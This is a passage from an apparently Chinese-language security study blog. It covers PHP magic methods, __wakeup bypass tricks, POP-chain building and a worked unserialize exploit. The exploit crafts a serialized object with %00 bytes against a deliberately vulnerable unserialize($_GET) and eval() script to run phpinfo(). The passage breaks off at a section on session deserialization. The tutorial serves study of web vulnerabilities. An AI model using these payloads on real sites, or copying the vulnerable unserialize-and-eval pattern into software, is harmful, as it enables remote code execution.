<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>set</strong>跟<strong>get</strong>相反，一个是访问不存在的属性，一个是给不存在的属性赋值。</p>
<hr>
<p>__isset</p>
<p>对<strong>不可访问属性</strong>（比如private的属性）调用 <strong>isset()</strong> 或 <strong>empty()</strong> 时，<code>__isset()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>该魔术方法使用了<strong>isset()<strong>或者</strong>empty()<strong>只要属性是</strong>private</strong>或者不存在的都会触发。</p>
<hr>
<h4 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h4><p>对不可访问属性调用 <strong>unset()</strong> 时，**__unset()** 会被调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1</span><br></pre></td></tr></table></figure>

<p>如果一个类定义了魔术方法 <code>__unset()</code> ，那么我们就可以使用 <strong>unset()</strong> 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</p>
<hr>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h4><p><strong>serialize()</strong> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重载序列化调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 返回需要序列化的变量名，过滤掉password变量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到执行序列化之前会先执行<strong>sleep()函数，上面</strong>sleep的函数作用是过滤掉password的变量值。</p>
<hr>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h4><p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义反序列化后调用的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>#1 (4) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$nickname</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到执行反序列化之前会先执行<strong>wakeup()函数，上面</strong>wakeup的函数作用是将username的变量值赋值给password变量。</p>
<hr>
<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h4><p><strong>__toString()</strong> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString test</span><br></pre></td></tr></table></figure>

<p>特别注意__toString的触发条件，引用k0rz3n师傅的笔记：</p>
<blockquote>
<p>(1)echo ($obj) &#x2F; print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<hr>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h4><p>当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <code>__clone()</code> ，如果该魔术方法存在的话。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="wakeup-函数绕过漏洞原理"><a href="#wakeup-函数绕过漏洞原理" class="headerlink" title="__wakeup()函数绕过漏洞原理"></a>__wakeup()函数绕过漏洞原理</h3><h4 id="1-低版本的php"><a href="#1-低版本的php" class="headerlink" title="1.低版本的php"></a>1.低版本的php</h4><blockquote>
<p><code>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p><code>从而绕过了__wakeup()函数</code></p>
</blockquote>
<h4 id="2-高一些的版本"><a href="#2-高一些的版本" class="headerlink" title="2.高一些的版本"></a>2.高一些的版本</h4><p>举个例子，</p>
<blockquote>
<p><code>C:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p>
</blockquote>
<p>关键是把<code>O:</code>改成<code>C:</code>，</p>
<p><strong>原理是</strong></p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">C:</span>代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了</span><br></pre></td></tr></table></figure>

<h3 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h3><blockquote>
<p>实际环境中不可能存在直接反序列化就能实现命令执行的情况，这个时候就要用到我们刚学到的一些<code>魔术方法</code>的相互触发，来构造一条popchain，从反序列化接口开始，<strong>一级一级的触发</strong>【所以就需要清楚各个魔术方法的触发情况】，最终到达我们目的想要执行的<code>方法/函数</code></p>
</blockquote>
<hr>
<h3 id="个人-一些文章对-php反序列化的一些认知"><a href="#个人-一些文章对-php反序列化的一些认知" class="headerlink" title="*个人+一些文章对 php反序列化的一些认知"></a>*个人+一些文章对 php反序列化的一些认知</h3><p>举例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>正常实例化后会执行<code>normal</code>类里面的<code>action</code>方法，但是<code>unserialize</code>函数是可控的，我们就可以对其进行攻击，思路就是改变<code>index</code>类里面<code>test</code>属性的值，让它实例化<code>evil</code>类，从而执行<code>evil</code>里面的<code>action</code>方法，同时我们也要修改<code>evil</code>类里面的<code>test2</code>属性的值</p>
<hr>
<p>因为<code>类不同于函数</code>，<code>定义完之后无法直接使用</code>，因为类<code>只是一个抽象的概念</code>，<u><strong>需要通过关键字new来实例化类，才可以使用</strong></u>。类实例化的语法格式如下：<strong>变量名&#x3D;new 类名（[构造函数]）</strong>。</p>
<p>其中，变量名可以为<strong>任何PHP变量的名称</strong>，构造参数取决于<strong>类的构造函数</strong>，若<strong>无构造函数，则圆括号中为空</strong>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实例化一个类后即可使用该类</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>这里反序化的，先是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure>

<p>实例化index()类，然后调动其<code>test</code>变量实例化<code>evil)()</code>，</p>
<p>使其能够被调用，然后根据</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure>

<p>我们对<code>test2</code>变量进行赋值命令语句，使得我们可以利用其中的<code>eval</code>函数，执行一些命令来拿到我们所需要的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>最后对序列化的<strong>入口类</strong>(<code>index.php</code>)序列化，然后把序列化结果导入，再由源码中反序列化函数后，从而实现我们想要的结构</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>比如这里就是以<code>GET</code>方式传参<code>test</code>参数，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=序列化结果</span><br></pre></td></tr></table></figure>

<p><strong>但是序列化的结果未必都是没有问题的，因为<code>%00</code>这个空字符是无法显示，只能输入进去</strong></p>
<p>以上面为例子，序列化后结果为</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如果用了这个是会报错的，</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220927091524021.png"><img src="/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></a></p>
<p>因为这里的参数有问题</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们仔细看一下属性值是<code>11</code>，但是后面的<code>indextest</code>总共是<code>9</code>个字符，所以丢失了两个字符，这两个字符就是空字符<code>%00</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们加上后再试试</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220927091556911.png"><img src="/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></a></p>
<p>就实现了我们的目的操作</p>
<p>当然其实还可能有的情况后面不是<code>eval()</code>的命令执行，可能是文件包含，或者其他操作，按这种思路走大都是没有问题的</p>
<h3 id="session的反序列化漏洞"><a href="#session的反序列化漏洞" class="headerlink" title="session的反序列化漏洞"></a>session的反序列化漏洞</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session的反序列化漏洞，就是利用`php`处理器和`php_serialize`处理器的存储格式差异而产生，通过具体的代码我们来看下漏洞出现的原因</span><br></pre></td></tr></table></figure>



<h4 id="PHP-session序列化机制"><a href="#PHP-session序列化机制" class="headerlink" title="PHP session序列化机制"></a>PHP session序列化机制</h4><p>根据<code>php.ini</code>中的配置项，我们研究将<code>$_SESSION</code>中保存的所有数据序列化存储到<code>PHPSESSID</code>对应的文件中，使用的三种不同的处理格式，即<code>session.serialize_handler</code>定义的三种引擎：</p>
<table>
<thead>
<tr>
<th align="center">处理器</th>
